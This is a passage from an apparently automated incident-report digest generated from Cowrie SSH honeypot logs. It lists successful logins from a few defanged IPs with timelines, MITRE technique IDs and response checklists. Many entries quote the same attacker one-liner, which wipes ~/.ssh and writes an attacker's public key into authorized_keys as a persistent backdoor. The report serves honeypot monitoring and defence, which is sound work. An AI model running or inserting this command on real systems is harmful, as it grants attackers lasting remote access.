| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:42:32` | `cowrie.session.connect` |
| `2026-06-04 06:42:32` | `cowrie.client.version` |
| `2026-06-04 06:42:33` | `cowrie.client.kex` |
| `2026-06-04 06:42:33` | `cowrie.login.success` |
| `2026-06-04 06:42:34` | `cowrie.session.params` |
| `2026-06-04 06:42:34` | `cowrie.command.input` |
| `2026-06-04 06:42:34` | `cowrie.command.failed` |
| `2026-06-04 06:42:34` | `cowrie.log.closed` |
| `2026-06-04 06:42:34` | `cowrie.session.params` |
| `2026-06-04 06:42:34` | `cowrie.command.input` |
| `2026-06-04 06:42:34` | `cowrie.session.file_download` |
| `2026-06-04 06:42:34` | `cowrie.log.closed` |
| `2026-06-04 06:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fead3dce4698

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:42 |
| **Last Seen** | 2026-06-04 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:42:37` | `cowrie.session.connect` |
| `2026-06-04 06:42:37` | `cowrie.client.version` |
| `2026-06-04 06:42:37` | `cowrie.client.kex` |
| `2026-06-04 06:42:38` | `cowrie.login.success` |
| `2026-06-04 06:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c9dce89f105

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:45 |
| **Last Seen** | 2026-06-04 06:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:45:20` | `cowrie.session.connect` |
| `2026-06-04 06:45:20` | `cowrie.client.version` |
| `2026-06-04 06:45:20` | `cowrie.client.kex` |
| `2026-06-04 06:45:21` | `cowrie.login.success` |
| `2026-06-04 06:45:21` | `cowrie.session.params` |
| `2026-06-04 06:45:21` | `cowrie.command.input` |
| `2026-06-04 06:45:21` | `cowrie.command.failed` |
| `2026-06-04 06:45:21` | `cowrie.log.closed` |
| `2026-06-04 06:45:22` | `cowrie.session.params` |
| `2026-06-04 06:45:22` | `cowrie.command.input` |
| `2026-06-04 06:45:22` | `cowrie.session.file_download` |
| `2026-06-04 06:45:22` | `cowrie.log.closed` |
| `2026-06-04 06:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6aaa62853ba

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:45 |
| **Last Seen** | 2026-06-04 06:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:45:25` | `cowrie.session.connect` |
| `2026-06-04 06:45:25` | `cowrie.client.version` |
| `2026-06-04 06:45:25` | `cowrie.client.kex` |
| `2026-06-04 06:45:25` | `cowrie.login.success` |
| `2026-06-04 06:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49996507c597

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:46 |
| **Last Seen** | 2026-06-04 06:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:46:34` | `cowrie.session.connect` |
| `2026-06-04 06:46:34` | `cowrie.client.version` |
| `2026-06-04 06:46:37` | `cowrie.client.kex` |
| `2026-06-04 06:46:37` | `cowrie.login.success` |
| `2026-06-04 06:46:38` | `cowrie.session.params` |
| `2026-06-04 06:46:38` | `cowrie.command.input` |
| `2026-06-04 06:46:38` | `cowrie.command.failed` |
| `2026-06-04 06:46:38` | `cowrie.log.closed` |
| `2026-06-04 06:46:38` | `cowrie.session.params` |
| `2026-06-04 06:46:38` | `cowrie.command.input` |
| `2026-06-04 06:46:38` | `cowrie.session.file_download` |
| `2026-06-04 06:46:38` | `cowrie.log.closed` |
| `2026-06-04 06:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fc13d2b1865

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:46 |
| **Last Seen** | 2026-06-04 06:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:46:41` | `cowrie.session.connect` |
| `2026-06-04 06:46:41` | `cowrie.client.version` |
| `2026-06-04 06:46:42` | `cowrie.client.kex` |
| `2026-06-04 06:46:43` | `cowrie.login.success` |
| `2026-06-04 06:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7f28c80a2ff

| Field | Detail |
|---|---|
| **Source IP** | `5.75.225[.]42` |
| **First Seen** | 2026-06-04 06:46 |
| **Last Seen** | 2026-06-04 06:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:46:44` | `cowrie.session.connect` |
| `2026-06-04 06:46:44` | `cowrie.client.version` |
| `2026-06-04 06:46:44` | `cowrie.client.kex` |
| `2026-06-04 06:46:44` | `cowrie.login.success` |
| `2026-06-04 06:46:45` | `cowrie.session.params` |
| `2026-06-04 06:46:45` | `cowrie.command.input` |
| `2026-06-04 06:46:45` | `cowrie.command.failed` |
| `2026-06-04 06:46:45` | `cowrie.log.closed` |
| `2026-06-04 06:46:45` | `cowrie.session.params` |
| `2026-06-04 06:46:45` | `cowrie.command.input` |
| `2026-06-04 06:46:45` | `cowrie.session.file_download` |
| `2026-06-04 06:46:45` | `cowrie.log.closed` |
| `2026-06-04 06:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.75.225[.]42` to AbuseIPDB if not already reported
- [ ] Block `5.75.225[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-305e742ab912

| Field | Detail |
|---|---|
| **Source IP** | `5.75.225[.]42` |
| **First Seen** | 2026-06-04 06:46 |
| **Last Seen** | 2026-06-04 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:46:47` | `cowrie.session.connect` |
| `2026-06-04 06:46:47` | `cowrie.client.version` |
| `2026-06-04 06:46:47` | `cowrie.client.kex` |
| `2026-06-04 06:46:48` | `cowrie.login.success` |
| `2026-06-04 06:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.75.225[.]42` to AbuseIPDB if not already reported
- [ ] Block `5.75.225[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79b12817fe56

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:47 |
| **Last Seen** | 2026-06-04 06:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:47:23` | `cowrie.session.connect` |
| `2026-06-04 06:47:23` | `cowrie.client.version` |
| `2026-06-04 06:47:23` | `cowrie.client.kex` |
| `2026-06-04 06:47:24` | `cowrie.login.success` |
| `2026-06-04 06:47:24` | `cowrie.session.params` |
| `2026-06-04 06:47:24` | `cowrie.command.input` |
| `2026-06-04 06:47:24` | `cowrie.command.failed` |
| `2026-06-04 06:47:24` | `cowrie.log.closed` |
| `2026-06-04 06:47:25` | `cowrie.session.params` |
| `2026-06-04 06:47:25` | `cowrie.command.input` |
| `2026-06-04 06:47:25` | `cowrie.session.file_download` |
| `2026-06-04 06:47:25` | `cowrie.log.closed` |
| `2026-06-04 06:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96139bf356d7

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:47 |
| **Last Seen** | 2026-06-04 06:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:47:27` | `cowrie.session.connect` |
| `2026-06-04 06:47:30` | `cowrie.client.version` |
| `2026-06-04 06:47:30` | `cowrie.client.kex` |
| `2026-06-04 06:47:30` | `cowrie.login.success` |
| `2026-06-04 06:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24d90f933e2f

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-06-04 06:49 |
| **Last Seen** | 2026-06-04 06:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:49:04` | `cowrie.session.connect` |
| `2026-06-04 06:49:04` | `cowrie.client.version` |
| `2026-06-04 06:49:04` | `cowrie.client.kex` |
| `2026-06-04 06:49:05` | `cowrie.login.success` |
| `2026-06-04 06:49:05` | `cowrie.session.params` |
| `2026-06-04 06:49:05` | `cowrie.command.input` |
| `2026-06-04 06:49:05` | `cowrie.command.failed` |
| `2026-06-04 06:49:06` | `cowrie.log.closed` |
| `2026-06-04 06:49:06` | `cowrie.session.params` |
| `2026-06-04 06:49:06` | `cowrie.command.input` |
| `2026-06-04 06:49:06` | `cowrie.session.file_download` |
| `2026-06-04 06:49:06` | `cowrie.log.closed` |
| `2026-06-04 06:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bafa05f521e

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-06-04 06:49 |
| **Last Seen** | 2026-06-04 06:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:49:08` | `cowrie.session.connect` |
| `2026-06-04 06:49:08` | `cowrie.client.version` |
| `2026-06-04 06:49:08` | `cowrie.client.kex` |
| `2026-06-04 06:49:09` | `cowrie.login.success` |
| `2026-06-04 06:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4fe32e42e0d

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:49 |
| **Last Seen** | 2026-06-04 06:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:49:19` | `cowrie.session.connect` |
| `2026-06-04 06:49:19` | `cowrie.client.version` |
| `2026-06-04 06:49:20` | `cowrie.client.kex` |
| `2026-06-04 06:49:20` | `cowrie.login.success` |
| `2026-06-04 06:49:21` | `cowrie.session.params` |
| `2026-06-04 06:49:21` | `cowrie.command.input` |
| `2026-06-04 06:49:21` | `cowrie.command.failed` |
| `2026-06-04 06:49:21` | `cowrie.log.closed` |
| `2026-06-04 06:49:21` | `cowrie.session.params` |
| `2026-06-04 06:49:21` | `cowrie.command.input` |
| `2026-06-04 06:49:21` | `cowrie.session.file_download` |
| `2026-06-04 06:49:21` | `cowrie.log.closed` |
| `2026-06-04 06:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef123fb4171a

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:49 |
| **Last Seen** | 2026-06-04 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:49:24` | `cowrie.session.connect` |
| `2026-06-04 06:49:24` | `cowrie.client.version` |
| `2026-06-04 06:49:24` | `cowrie.client.kex` |
| `2026-06-04 06:49:25` | `cowrie.login.success` |
| `2026-06-04 06:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2a6c7b45d4f

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:49 |
| **Last Seen** | 2026-06-04 06:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:49:43` | `cowrie.session.connect` |
| `2026-06-04 06:49:43` | `cowrie.client.version` |
| `2026-06-04 06:49:43` | `cowrie.client.kex` |
| `2026-06-04 06:49:44` | `cowrie.login.success` |
| `2026-06-04 06:49:44` | `cowrie.session.params` |
| `2026-06-04 06:49:44` | `cowrie.command.input` |
| `2026-06-04 06:49:44` | `cowrie.command.failed` |
| `2026-06-04 06:49:44` | `cowrie.log.closed` |
| `2026-06-04 06:49:45` | `cowrie.session.params` |
| `2026-06-04 06:49:45` | `cowrie.command.input` |
| `2026-06-04 06:49:45` | `cowrie.session.file_download` |
| `2026-06-04 06:49:45` | `cowrie.log.closed` |
| `2026-06-04 06:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6a561f79a64

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:49 |
| **Last Seen** | 2026-06-04 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:49:47` | `cowrie.session.connect` |
| `2026-06-04 06:49:47` | `cowrie.client.version` |
| `2026-06-04 06:49:48` | `cowrie.client.kex` |
| `2026-06-04 06:49:48` | `cowrie.login.success` |
| `2026-06-04 06:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8117b7ad8d5

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:50 |
| **Last Seen** | 2026-06-04 06:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:50:52` | `cowrie.session.connect` |
| `2026-06-04 06:50:52` | `cowrie.client.version` |
| `2026-06-04 06:50:52` | `cowrie.client.kex` |
| `2026-06-04 06:50:53` | `cowrie.login.success` |
| `2026-06-04 06:50:53` | `cowrie.session.params` |
| `2026-06-04 06:50:53` | `cowrie.command.input` |
| `2026-06-04 06:50:53` | `cowrie.command.failed` |
| `2026-06-04 06:50:53` | `cowrie.log.closed` |
| `2026-06-04 06:50:54` | `cowrie.session.params` |
| `2026-06-04 06:50:54` | `cowrie.command.input` |
| `2026-06-04 06:50:54` | `cowrie.session.file_download` |
| `2026-06-04 06:50:54` | `cowrie.log.closed` |
| `2026-06-04 06:50:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.152.201[.]166` to AbuseIPDB if not already reported
- [ ] Block `202.152.201[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d9290712f43

| Field | Detail |
|---|---|
| **Source IP** | `202.152.201[.]166` |
| **First Seen** | 2026-06-04 06:50 |
| **Last Seen** | 2026-06-04 06:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 06:50:56` | `cowrie.session.connect` |
